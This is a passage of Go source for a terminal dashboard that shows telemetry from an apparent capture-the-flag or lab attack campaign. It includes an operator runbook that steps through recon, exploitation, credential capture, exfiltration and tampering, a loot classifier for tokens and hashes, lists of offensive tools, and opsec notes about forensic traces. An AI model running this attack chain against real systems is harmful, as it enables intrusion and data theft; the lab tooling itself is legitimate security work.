		lines = append(lines, host+" -> "+truncate(strings.TrimSpace(item.Name), 34))
		count++
		if count >= 4 {
			break
		}
	}
	return wrap(strings.Join(lines, " | "), width)
}

func operatorRunbook(targetURL string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	target := strings.TrimSpace(targetURL)
	if target == "" {
		return wrap("1) set active target URL in CTRL TARGET | 2) validate target state info | 3) then execute recon/exploit chain", width)
	}
	s := deriveChainSnapshot(commands, findings, loot)
	steps := []string{}
	switch {
	case !s.Recon:
		steps = append(steps,
			"1) curl -sSI "+target,
			"2) python3 ./scripts/security_pipeline.py --target "+target+" --pipeline surface-map",
			"3) python3 ./scripts/security_pipeline.py --target "+target+" --pipeline web-enum",
		)
	case !s.Breach:
		steps = append(steps,
			"1) python3 ./scripts/security_pipeline.py --target "+target+" --pipeline api-probe",
			"2) python3 ./scripts/security_pipeline.py --target "+target+" --pipeline initial-exploit",
			"3) validate token/session artifact in LOOT",
		)
	case !s.Access:
		steps = append(steps,
			"1) replay validated exploit from OPS",
			"2) enumerate privileged resources/endpoints",
			"3) capture credential/hash/session artifacts into loot",
		)
	case !s.Exfil:
		steps = append(steps,
			"1) enumerate exposed artifacts/backups",
			"2) collect docs/binaries/tokens/db extracts",
			"3) snapshot telemetry evidence",
		)
	case !s.Tamper:
		steps = append(steps,
			"1) test controlled integrity mutation",
			"2) capture before/after API response",
			"3) log finding with business impact",
		)
	default:
		steps = append(steps,
			"1) run post-enum/password/privesc pipeline",
			"2) validate privilege boundary crossing",
			"3) freeze replay bundle and report",
		)
	}
	return wrap(strings.Join(steps, " | "), width)
}

func opsecTrail(commands []commandEntry, findings []findingEntry, width int) string {
	noisyTools := []string{"nmap", "nikto", "nuclei", "sqlmap", "ffuf", "gobuster", "hydra", "medusa", "msfconsole"}
	noise := 0
	for _, cmd := range commands {
		lc := strings.ToLower(cmd.Command + " " + cmd.Tool)
		for _, t := range noisyTools {
			if strings.Contains(lc, t) {
				noise++
				break
			}
		}
	}
	tokenOps := 0
	for _, cmd := range commands {
		if strings.Contains(strings.ToLower(cmd.Command), "authorization: bearer") {
			tokenOps++
		}
	}
	lines := []string{
		metricLine("noisy actions", fmt.Sprintf("%d", noise)),
		metricLine("tokenized requests", fmt.Sprintf("%d", tokenOps)),
		metricLine("critical findings", fmt.Sprintf("%d", countSeverity(findings, "critical"))),
		"trail surfaces :: web logs, reverse-proxy logs, auth logs, docker exec history",
	}
	if noise > 20 {
		lines = append(lines, "opsec note :: high scan volume likely leaves obvious forensic signature")
	}
	return wrap(strings.Join(lines, " | "), width)
}

func chainFollowupGuidance(category, sub string, commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	s := deriveChainSnapshot(commands, findings, loot)
	missing := attackChainMissing(s)
	if len(missing) == 0 {
		return "chain-ready :: this node can be expanded for depth, replay, or report evidence."
	}
	return wrap(
		fmt.Sprintf("%s/%s missing prerequisites :: %s", category, sub, strings.Join(missing, " + ")),
		width,
	)
}

func lootCompartment(kind string) string {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "flag":
		return "FLAGS"
	case "credential", "token", "jwt", "password", "hash":
		return "CREDS"
	case "vuln":
		return "VULNS"
	case "endpoint", "path":
		return "PATHS"
	case "artifact", "file", "document", "backup", "binary":
		return "ARTIFACTS"
	default:
		return "OTHER"
	}
}

func lootCompartmentOrder() []string {
	return []string{"FLAGS", "CREDS", "VULNS", "PATHS", "ARTIFACTS", "OTHER"}
}

func isOSINTLoot(item lootEntry) bool {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	if strings.Contains(meta, "artifacts/osint/") || strings.Contains(meta, "/artifacts/osint/") {
		return true
	}
	antiMarkers := []string{"nmap", "nikto", "ffuf", "gobuster", "nuclei", "sqlmap", "hydra", "msfconsole", "xss", "sqli", "caldera", "coop-caldera", "sandcat", "stockpile"}
	for _, marker := range antiMarkers {
		if strings.Contains(meta, marker) {
			return false
		}
	}
	markers := []string{
		"osint result", "theharvester", "bbot", "spiderfoot", "recon-ng", "reconng", "rengine",
		"whois", "subdomain", "dns", "crt.sh", "seed harvest", "maltego",
	}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isOnchainLoot(item lootEntry) bool {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	if strings.Contains(meta, "artifacts/onchain/") || strings.Contains(meta, "/artifacts/onchain/") {
		return true
	}
	markers := []string{
		"onchain result", "slither", "mythril", "myth", "forge", "cast", "anvil",
		"echidna", "medusa", "halmos", "smart contract", "evm", "solidity", "bytecode", "address-flow", "rpc-check", "rpc-catalog", "4d correlation",
	}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isCoopLoot(item lootEntry) bool {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	if strings.Contains(meta, "artifacts/coop/") || strings.Contains(meta, "/artifacts/coop/") {
		return true
	}
	markers := []string{"caldera", "coop", "c2", "sandcat", "stockpile", "operation", "agent"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func osintLootToolBucket(item lootEntry) string {
	meta := strings.ToLower(item.Name + " " + item.Source + " " + item.Preview)
	switch {
	case strings.Contains(meta, "theharvester"), strings.Contains(meta, "seed harvest"):
		return "THEHARVESTER"
	case strings.Contains(meta, "bbot"):
		return "BBOT"
	case strings.Contains(meta, "spiderfoot"):
		return "SPIDERFOOT"
	case strings.Contains(meta, "recon-ng"), strings.Contains(meta, "reconng"):
		return "RECON-NG"
	case strings.Contains(meta, "rengine"):
		return "RENGINE"
	case strings.Contains(meta, "maltego"):
		return "MALTEGO"
	default:
		return "OSINT-OTHER"
	}
}

func osintLootToolOrder() []string {
	return []string{"THEHARVESTER", "BBOT", "SPIDERFOOT", "RECON-NG", "RENGINE", "MALTEGO", "OSINT-OTHER"}
}

func onchainLootToolBucket(item lootEntry) string {
	meta := strings.ToLower(item.Name + " " + item.Source + " " + item.Preview)
	switch {
	case strings.Contains(meta, "rpc-catalog"):
		return "RPC-CATALOG"
	case strings.Contains(meta, "address-flow"):
		return "ADDRESS-FLOW"
	case strings.Contains(meta, "rpc-check"):
		return "RPC-CHECK"
	case strings.Contains(meta, "slither"):
		return "SLITHER"
	case strings.Contains(meta, "mythril"), strings.Contains(meta, "myth "):
		return "MYTHRIL"
	case strings.Contains(meta, "forge"), strings.Contains(meta, "anvil"), strings.Contains(meta, "cast"):
		return "FOUNDRY"
	case strings.Contains(meta, "echidna"):
		return "ECHIDNA"
	case strings.Contains(meta, "medusa"):
		return "MEDUSA"
	case strings.Contains(meta, "halmos"):
		return "HALMOS"
	default:
		return "ONCHAIN-OTHER"
	}
}

func onchainLootToolOrder() []string {
	return []string{"RPC-CATALOG", "RPC-CHECK", "ADDRESS-FLOW", "SLITHER", "MYTHRIL", "FOUNDRY", "ECHIDNA", "MEDUSA", "HALMOS", "ONCHAIN-OTHER"}
}

func lootDisplayOrderByMode(loot []lootEntry, osintMode, onchainMode bool) []int {
	if osintMode {
		return osintLootDisplayOrder(loot)
	}
	if onchainMode {
		return onchainLootDisplayOrder(loot)
	}
	return exploitLootDisplayOrder(loot)
}

func exploitLootDisplayOrder(loot []lootEntry) []int {
	grouped := map[string][]int{}
	for i, item := range loot {
		if isOSINTLoot(item) || isOnchainLoot(item) {
			continue
		}
		comp := lootCompartment(item.Kind)
		grouped[comp] = append(grouped[comp], i)
	}
	out := make([]int, 0, len(loot))
	for _, comp := range lootCompartmentOrder() {
		out = append(out, grouped[comp]...)
	}
	return out
}

func osintLootDisplayOrder(loot []lootEntry) []int {
	grouped := map[string][]int{}
	for i := len(loot) - 1; i >= 0; i-- {
		item := loot[i]
		if !isOSINTLoot(item) {
			continue
		}
		bucket := osintLootToolBucket(item)
		grouped[bucket] = append(grouped[bucket], i)
	}
	out := make([]int, 0, len(loot))
	for _, bucket := range osintLootToolOrder() {
		out = append(out, grouped[bucket]...)
	}
	return out
}

func onchainLootDisplayOrder(loot []lootEntry) []int {
	grouped := map[string][]int{}
	for i := len(loot) - 1; i >= 0; i-- {
		item := loot[i]
		if !isOnchainLoot(item) {
			continue
		}
		bucket := onchainLootToolBucket(item)
		grouped[bucket] = append(grouped[bucket], i)
	}
	out := make([]int, 0, len(loot))
	for _, bucket := range onchainLootToolOrder() {
		out = append(out, grouped[bucket]...)
	}
	return out
}

func lootSubsetByOrder(loot []lootEntry, order []int) []lootEntry {
	out := make([]lootEntry, 0, len(order))
	for _, idx := range order {
		if idx >= 0 && idx < len(loot) {
			out = append(out, loot[idx])
		}
	}
	return out
}

func indexInOrder(order []int, selected int) int {
	for pos, idx := range order {
		if idx == selected {
			return pos
		}
	}
	return -1
}

func lootSubsetByMode(loot []lootEntry, osintMode, onchainMode bool) []lootEntry {
	return lootSubsetByOrder(loot, lootDisplayOrderByMode(loot, osintMode, onchainMode))
}

func lootInventoryListByMode(loot []lootEntry, order []int, selected, width int, osintMode, onchainMode bool) []string {
	if len(order) == 0 {
		return nil
	}
	lines := []string{}
	currentGroup := ""
	groupCounts := map[string]int{}
	for _, idx := range order {
		group := lootCompartment(loot[idx].Kind)
		if osintMode {
			group = osintLootToolBucket(loot[idx])
		}
		if onchainMode {
			group = onchainLootToolBucket(loot[idx])
		}
		groupCounts[group]++
	}
	for _, idx := range order {
		item := loot[idx]
		group := lootCompartment(item.Kind)
		if osintMode {
			group = osintLootToolBucket(item)
		}
		if onchainMode {
			group = onchainLootToolBucket(item)
		}
		if group != currentGroup {
			currentGroup = group
			header := lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true).Padding(0, 1).
				Render(fmt.Sprintf("%s x%d", group, groupCounts[group]))
			lines = append(lines, header)
		}
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("250"))
		metaStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("242"))
		if idx == selected {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			metaStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		}
		risk := lootRisk(item)
		lines = append(lines, style.Render(fmt.Sprintf("%s%s %s %s", prefix, kindBadge(item.Kind), severityBadge(risk.Severity), truncate(item.Name, max(16, width-30)))))
		if osintMode || onchainMode {
			lines = append(lines, metaStyle.Render(fmt.Sprintf("   %s :: %s", truncate(item.Source, max(20, width-22)), shortTime(item.Timestamp))))
			preview := strings.TrimSpace(item.Preview)
			if preview != "" {
				lines = append(lines, metaStyle.Render("   ↳ "+truncate(preview, max(28, width-8))))
			}
		} else {
			lines = append(lines, metaStyle.Render(fmt.Sprintf("   %s :: %s", truncate(item.Source, max(16, width-20)), shortTime(item.Timestamp))))
		}
	}
	return lines
}

func osintLootToolSummary(loot []lootEntry, width int) string {
	if len(loot) == 0 {
		return "no osint results collected yet"
	}
	counts := map[string]int{}
	for _, item := range loot {
		counts[osintLootToolBucket(item)]++
	}
	lines := []string{}
	for _, bucket := range osintLootToolOrder() {
		if counts[bucket] == 0 {
			continue
		}
		lines = append(lines, fmt.Sprintf("%s :: %d", bucket, counts[bucket]))
	}
	return wrap(strings.Join(lines, " | "), width)
}

func onchainLootToolSummary(loot []lootEntry, width int) string {
	if len(loot) == 0 {
		return "no onchain results collected yet"
	}
	counts := map[string]int{}
	for _, item := range loot {
		counts[onchainLootToolBucket(item)]++
	}
	lines := []string{}
	for _, bucket := range onchainLootToolOrder() {
		if counts[bucket] == 0 {
			continue
		}
		lines = append(lines, fmt.Sprintf("%s :: %d", bucket, counts[bucket]))
	}
	return wrap(strings.Join(lines, " | "), width)
}

func osintLootStream(loot []lootEntry, width, limit int) string {
	if len(loot) == 0 {
		return "no osint loot captured yet"
	}
	if limit <= 0 {
		limit = 10
	}
	lines := []string{}
	count := 0
	for i := len(loot) - 1; i >= 0; i-- {
		if count >= limit {
			break
		}
		item := loot[i]
		tool := osintLootToolBucket(item)
		header := fmt.Sprintf("[%s] %s", tool, truncate(item.Name, max(20, width-12)))
		lines = append(lines, truncate(header, width))
		lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render(truncate(item.Source, width)))
		if preview := strings.TrimSpace(item.Preview); preview != "" {
			lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("244")).Render(truncate(preview, width)))
		}
		lines = append(lines, "")
		count++
	}
	return strings.TrimSpace(strings.Join(lines, "\n"))
}

func lootRisk(item lootEntry) lootRiskView {
	kind := strings.ToLower(strings.TrimSpace(item.Kind))
	src := strings.ToLower(item.Source + " " + item.Preview + " " + item.Name)
	switch {
	case kind == "flag":
		return lootRiskView{Severity: "critical", CriticalIssue: "Challenge flag was captured; objective compromise confirmed.", Taxonomy: "IMPACT::EXFIL"}
	case kind == "credential" || kind == "token" || kind == "jwt":
		return lootRiskView{Severity: "high", CriticalIssue: "Credentials/token material can enable account takeover and privilege abuse.", Taxonomy: "BREACH::AUTH"}
	case kind == "vuln":
		return lootRiskView{Severity: "high", CriticalIssue: "Referenced vulnerability may be weaponizable for escalation or code execution.", Taxonomy: "BREACH::ACCESS"}
	case kind == "path" && strings.Contains(src, "/admin"):
		return lootRiskView{Severity: "high", CriticalIssue: "Administrative path disclosure exposes high-value attack surface.", Taxonomy: "DISCOVER::SURFACE"}
	case kind == "path":
		return lootRiskView{Severity: "medium", CriticalIssue: "Exposed hidden path broadens reachable attack surface.", Taxonomy: "DISCOVER::SURFACE"}
	case kind == "artifact" || kind == "file" || kind == "binary":
		return lootRiskView{Severity: "medium", CriticalIssue: "Captured artifact may contain sensitive internals or exploitable metadata.", Taxonomy: "IMPACT::EXFIL"}
	default:
		return lootRiskView{Severity: "low", CriticalIssue: "Informational loot item; correlate with findings before escalation.", Taxonomy: "DISCOVER::INTEL"}
	}
}

func lootWhere(item lootEntry) string {
	source := strings.TrimSpace(item.Source)
	if source == "" {
		return "unknown origin"
	}
	if strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://") {
		parsed, err := url.Parse(source)
		if err == nil {
			host := valueOr(parsed.Host, "unknown-host")
			path := valueOr(parsed.Path, "/")
			return host + path
		}
	}
	return source
}

func lootRawContent(root string, item lootEntry) string {
	preview := strings.TrimSpace(item.Preview)
	if preview == "" {
		return "no raw content"
	}
	path := extractArtifactPath(preview)
	if path != "" {
		full := filepath.Join(root, path)
		data, err := os.ReadFile(full)
		if err == nil {
			text := strings.TrimSpace(string(data))
			if text == "" {
				return "artifact is empty :: " + path
			}
			return truncate(text, 8000)
		}
	}
	return preview
}

func extractArtifactPath(text string) string {
	re := regexp.MustCompile(`\bartifacts/[^\s]+`)
	match := re.FindString(text)
	return strings.TrimSpace(match)
}

func augmentLootWithFindings(loot []lootEntry, findings []findingEntry, targetURL string) []lootEntry {
	out := make([]lootEntry, 0, len(loot)+8)
	out = append(out, loot...)
	seen := map[string]bool{}
	for _, item := range loot {
		kind := strings.ToLower(strings.TrimSpace(item.Kind))
		name := strings.ToLower(strings.TrimSpace(item.Name))
		source := strings.ToLower(strings.TrimSpace(item.Source))
		keyPrimary := strings.TrimSpace(kind + "|" + name + "|" + source)
		if keyPrimary != "" {
			seen[keyPrimary] = true
		}
		if kind == "path" || kind == "artifact" {
			keyBySource := strings.TrimSpace(kind + "|" + source)
			if keyBySource != "" {
				seen[keyBySource] = true
			}
		}
	}
	base := strings.TrimSpace(targetURL)
	base = strings.TrimRight(base, "/")
	isLikelyEndpoint := func(endpoint string) bool {
		e := strings.TrimSpace(endpoint)
		if e == "" {
			return false
		}
		if strings.HasPrefix(e, "http://") || strings.HasPrefix(e, "https://") {
			parsed, err := url.Parse(e)
			return err == nil && (strings.TrimSpace(parsed.Path) != "" || strings.TrimSpace(parsed.RawQuery) != "")
		}
		return strings.Contains(e, "/") || strings.Contains(e, "?") || strings.Contains(e, ":")
	}
	looksFileLike := func(endpoint string) bool {
		e := strings.ToLower(strings.TrimSpace(endpoint))
		return regexp.MustCompile(`\.[a-z0-9]{1,6}($|\?)`).MatchString(e)
	}
	for _, f := range findings {
		endpoint := strings.TrimSpace(f.Endpoint)
		if endpoint == "" {
			continue
		}
		meta := strings.ToLower(f.Title + " " + f.Evidence + " " + f.Impact + " " + endpoint)
		isPathSignal := isLikelyEndpoint(endpoint) ||
			strings.Contains(meta, "path") ||
			strings.Contains(meta, "endpoint") ||
			strings.Contains(meta, "route") ||
			strings.Contains(meta, "file") ||
			strings.Contains(meta, "artifact") ||
			strings.Contains(meta, "uri")
		if !isPathSignal {
			continue
		}
		source := endpoint
		if strings.HasPrefix(source, "/") {
			if base == "" {
				source = endpoint
			} else {
				source = base + source
			}
		}
		kind := "path"
		if looksFileLike(endpoint) {
			kind = "artifact"
		}
		entry := lootEntry{
			Timestamp: f.Timestamp,
			Kind:      kind,
			Name:      "finding artifact :: " + valueOr(f.Title, endpoint),
			Source:    source,
			Preview:   truncate(strings.TrimSpace(f.Evidence+" :: "+f.Impact), 320),
		}
		key := strings.ToLower(strings.TrimSpace(entry.Kind + "|" + entry.Source))
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, entry)
	}
	return out
}

func collapseLootEvents(loot []lootEntry) []lootEntry {
	if len(loot) == 0 {
		return loot
	}
	type kept struct {
		index int
		entry lootEntry
	}
	keep := map[string]kept{}
	buildKey := func(item lootEntry) string {
		kind := strings.ToLower(strings.TrimSpace(item.Kind))
		name := strings.ToLower(strings.TrimSpace(item.Name))
		source := strings.ToLower(strings.TrimSpace(item.Source))
		if kind == "path" || kind == "artifact" {
			return kind + "|" + source
		}
		return kind + "|" + name + "|" + source
	}
	for idx, item := range loot {
		key := buildKey(item)
		if key == "" || key == "||" {
			continue
		}
		keep[key] = kept{index: idx, entry: item}
	}
	indexes := make([]int, 0, len(keep))
	reverse := map[int]lootEntry{}
	for _, item := range keep {
		indexes = append(indexes, item.index)
		reverse[item.index] = item.entry
	}
	sort.Ints(indexes)
	out := make([]lootEntry, 0, len(indexes))
	for _, idx := range indexes {
		out = append(out, reverse[idx])
	}
	return out
}

func postureBadges(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	badges := []string{}
	add := func(ok bool, label string, style lipgloss.Style) {
		if ok {
			badges = append(badges, style.Render(label))
		}
	}
	hot := lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1)
	warn := lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("214")).Bold(true).Padding(0, 1)
	info := lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("111")).Bold(true).Padding(0, 1)
	gold := lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("186")).Bold(true).Padding(0, 1)

	add(hasFindingMatch(findings, "robots") || hasCommandMatch(commands, "robots.txt"), "SURFACE LEAK", warn)
	add(hasFindingMatch(findings, "index") || hasFindingMatch(findings, "listing") || hasCommandMatch(commands, "gobuster") || hasCommandMatch(commands, "ffuf"), "PATH DISCOVERY", warn)
	add(hasFindingMatch(findings, "auth bypass") || hasFindingMatch(findings, "authentication") || hasLootMatch(loot, "token"), "AUTH IMPACT", hot)
	add(hasLootMatch(loot, "credential") || hasLootMatch(loot, "hash"), "CRED MATERIAL", info)
	add(hasLootMatch(loot, ".bak") || hasFindingMatch(findings, "backup"), "BACKUP EXPOSURE", gold)
	add(hasLootMatch(loot, ".kdbx") || hasLootMatch(loot, "vault"), "VAULT ARTIFACT", gold)
	add(hasFindingMatch(findings, "tamper") || hasFindingMatch(findings, "integrity") || hasCommandMatch(commands, " PUT ") || hasCommandMatch(commands, " PATCH ") || hasCommandMatch(commands, " DELETE "), "INTEGRITY RISK", hot)
	add(hasFindingMatch(findings, "error") || hasFindingMatch(findings, "trace"), "ERROR TRACE", info)

	if len(badges) == 0 {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("no high-signal posture indicators inferred yet")
	}
	return wrapStyledBadges(badges, width)
}

func wrapStyledBadges(badges []string, width int) string {
	if width < 20 {
		return strings.Join(badges, "\n")
	}
	lines := []string{}
	line := ""
	visible := 0
	for _, badge := range badges {
		textWidth := lipgloss.Width(badge)
		if line != "" && visible+1+textWidth > width {
			lines = append(lines, line)
			line = badge
			visible = textWidth
			continue
		}
		if line == "" {
			line = badge
			visible = textWidth
		} else {
			line += " " + badge
			visible += 1 + textWidth
		}
	}
	if line != "" {
		lines = append(lines, line)
	}
	return strings.Join(lines, "\n")
}

func endpointBadge(label string) string {
	switch label {
	case "EXFIL":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("EXFIL")
	case "ABUSED":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("214")).Bold(true).Padding(0, 1).Render("ABUSED")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("111")).Bold(true).Padding(0, 1).Render("SEEN")
	}
}

func typeBadge(label string) string {
	switch label {
	case "AUTH":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("161")).Bold(true).Padding(0, 1).Render("AUTH")
	case "ADMIN":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("99")).Bold(true).Padding(0, 1).Render("ADMIN")
	case "FTP":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("186")).Bold(true).Padding(0, 1).Render("FTP")
	case "API":
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("117")).Bold(true).Padding(0, 1).Render("API")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render("WEB")
	}
}

func phasePill(label string) string {
	return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("62")).Bold(true).Padding(0, 1).Render(label)
}

func successFailBadge(ok, fail int) string {
	switch {
	case ok > 0 && fail == 0:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("84")).Bold(true).Padding(0, 1).Render("CLEAN")
	case fail > 0 && ok == 0:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("160")).Bold(true).Padding(0, 1).Render("BURN")
	case fail > 0:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("214")).Bold(true).Padding(0, 1).Render("MIXED")
	default:
		return lipgloss.NewStyle().Foreground(lipgloss.Color("16")).Background(lipgloss.Color("245")).Bold(true).Padding(0, 1).Render("IDLE")
	}
}

func miniMeter(ok, fail int) string {
	segments := make([]string, 0, 8)
	total := ok + fail
	if total == 0 {
		return lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("........")
	}
	okSlots := (ok * 8) / total
	if ok > 0 && okSlots == 0 {
		okSlots = 1
	}
	failSlots := 8 - okSlots
	for i := 0; i < okSlots; i++ {
		segments = append(segments, lipgloss.NewStyle().Foreground(lipgloss.Color("84")).Render("■"))
	}
	for i := 0; i < failSlots; i++ {
		segments = append(segments, lipgloss.NewStyle().Foreground(lipgloss.Color("160")).Render("■"))
	}
	return strings.Join(segments, "")
}

func isSuccessStatus(status string, exitCode int) bool {
	s := strings.ToLower(strings.TrimSpace(status))
	return s == "success" || s == "done" || s == "ok" || s == "complete" || s == "completed" || exitCode == 0
}

func isFailureStatus(status string, exitCode int) bool {
	s := strings.ToLower(strings.TrimSpace(status))
	return s == "error" || s == "failed" || s == "fail" || exitCode != 0
}

func hasCommandMatch(commands []commandEntry, needle string) bool {
	needle = strings.ToLower(needle)
	for _, cmd := range commands {
		if strings.Contains(strings.ToLower(cmd.Command), needle) || strings.Contains(strings.ToLower(cmd.OutputPreview), needle) {
			return true
		}
	}
	return false
}

func hasFindingMatch(findings []findingEntry, needle string) bool {
	needle = strings.ToLower(needle)
	for _, item := range findings {
		if strings.Contains(strings.ToLower(item.Title), needle) || strings.Contains(strings.ToLower(item.Endpoint), needle) || strings.Contains(strings.ToLower(item.Evidence), needle) {
			return true
		}
	}
	return false
}

func hasLootMatch(loot []lootEntry, needle string) bool {
	needle = strings.ToLower(needle)
	for _, item := range loot {
		if strings.Contains(strings.ToLower(item.Name), needle) || strings.Contains(strings.ToLower(item.Source), needle) || strings.Contains(strings.ToLower(item.Preview), needle) {
			return true
		}
	}
	return false
}

func endpointPriority(status string) int {
	switch status {
	case "EXFIL":
		return 3
	case "ABUSED":
		return 2
	default:
		return 1
	}
}

func classifyEndpoint(endpoint string) string {
	e := strings.ToLower(endpoint)
	switch {
	case strings.Contains(e, "/login") || strings.Contains(e, "authorization"):
		return "AUTH"
	case strings.Contains(e, "/rest/admin") || strings.Contains(e, "/api/users"):
		return "ADMIN"
	case strings.Contains(e, "/ftp"):
		return "FTP"
	case strings.Contains(e, "/api/") || strings.Contains(e, "/rest/"):
		return "API"
	default:
		return "WEB"
	}
}

func collapseCommandEvents(events []commandEntry) []commandEntry {
	if len(events) == 0 {
		return nil
	}
	type tracked struct {
		entry commandEntry
		index int
	}
	seen := map[string]*tracked{}
	order := []string{}
	for i := len(events) - 1; i >= 0; i-- {
		event := events[i]
		id := strings.TrimSpace(event.CommandID)
		if id == "" {
			id = fmt.Sprintf("legacy-%d-%s-%s", i, event.Tool, event.Command)
		}
		if seen[id] == nil {
			order = append(order, id)
			copy := event
			seen[id] = &tracked{entry: copy, index: len(order) - 1}
			continue
		}
		current := seen[id].entry
		if current.Status == "started" && event.Status != "started" {
			seen[id].entry = event
		}
	}
	out := make([]commandEntry, 0, len(order))
	for _, id := range order {
		out = append(out, seen[id].entry)
	}
	return out
}

func findingIdentityKey(item findingEntry) string {
	fields := []string{
		strings.ToLower(strings.TrimSpace(item.Severity)),
		strings.ToLower(strings.TrimSpace(item.Title)),
		strings.ToLower(strings.TrimSpace(item.Endpoint)),
		strings.ToLower(strings.TrimSpace(item.Phase)),
		strings.ToLower(strings.TrimSpace(item.Evidence)),
		strings.ToLower(strings.TrimSpace(item.Impact)),
	}
	return strings.Join(fields, "|")
}

func collapseFindingEvents(events []findingEntry) []findingEntry {
	seen := map[string]bool{}
	out := make([]findingEntry, 0, len(events))
	for i := len(events) - 1; i >= 0; i-- {
		item := events[i]
		key := findingIdentityKey(item)
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		out = append([]findingEntry{item}, out...)
	}
	return out
}

func detectTelemetryDir(root string) string {
	if looksLikeTelemetryDir(root) {
		return root
	}
	return filepath.Join(root, "telemetry")
}

func replayHint(root string) string {
	runsDir := filepath.Join(root, "telemetry", "runs")
	if looksLikeTelemetryDir(root) {
		runsDir = filepath.Join(filepath.Dir(root), "runs")
	}
	latest := latestReplayRun(runsDir)
	if latest == "" {
		return "./bin/juicetui telemetry/runs/<timestamp>"
	}
	return "./bin/juicetui " + latest
}

func latestReplayRun(runsDir string) string {
	entries, err := os.ReadDir(runsDir)
	if err != nil {
		return ""
	}
	latest := ""
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		if latest == "" || entry.Name() > latest {
			latest = entry.Name()
		}
	}
	if latest == "" {
		return ""
	}
	return filepath.Join(runsDir, latest)
}

func looksLikeTelemetryDir(path string) bool {
	required := []string{"state.json", "commands.jsonl", "findings.jsonl", "loot.jsonl"}
	for _, name := range required {
		if _, err := os.Stat(filepath.Join(path, name)); err != nil {
			return false
		}
	}
	return true
}

func inferCampaignRunID(source string) string {
	base := strings.TrimSpace(filepath.Base(source))
	match, _ := regexp.MatchString(`^\d{8}T\d{6}Z$`, base)
	if match {
		return base
	}
	return time.Now().UTC().Format("20060102T150405Z")
}

func importTelemetryCampaignRun(root, source string) (string, error) {
	source = filepath.Clean(strings.TrimSpace(source))
	if source == "" {
		return "", errors.New("empty source path")
	}
	if !looksLikeTelemetryDir(source) {
		return "", errors.New("source is not a telemetry campaign directory")
	}
	runsDir := filepath.Join(root, "telemetry", "runs")
	if err := os.MkdirAll(runsDir, 0o755); err != nil {
		return "", err
	}
	if strings.HasPrefix(source, filepath.Clean(runsDir)+string(os.PathSeparator)) {
		return source, nil
	}
	runID := inferCampaignRunID(source)
	dest := filepath.Join(runsDir, runID)
	if filepath.Clean(source) == filepath.Clean(dest) {
		return dest, nil
	}
	for i := 1; ; i++ {
		if _, err := os.Stat(dest); errors.Is(err, os.ErrNotExist) {
			break
		}
		dest = filepath.Join(runsDir, fmt.Sprintf("%s-%02d", runID, i))
	}
	if err := copyDirRecursive(source, dest); err != nil {
		return "", err
	}
	return dest, nil
}

func copyDirRecursive(source, dest string) error {
	info, err := os.Stat(source)
	if err != nil {
		return err
	}
	if !info.IsDir() {
		return fmt.Errorf("source is not a directory: %s", source)
	}
	if err := os.MkdirAll(dest, 0o755); err != nil {
		return err
	}
	entries, err := os.ReadDir(source)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		sourcePath := filepath.Join(source, entry.Name())
		destPath := filepath.Join(dest, entry.Name())
		if entry.IsDir() {
			if err := copyDirRecursive(sourcePath, destPath); err != nil {
				return err
			}
			continue
		}
		if err := copyFile(sourcePath, destPath); err != nil {
			return err
		}
	}
	return nil
}

func copyFile(source, dest string) error {
	in, err := os.Open(source)
	if err != nil {
		return err
	}
	defer in.Close()
	info, err := in.Stat()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(dest), 0o755); err != nil {
		return err
	}
	out, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode().Perm())
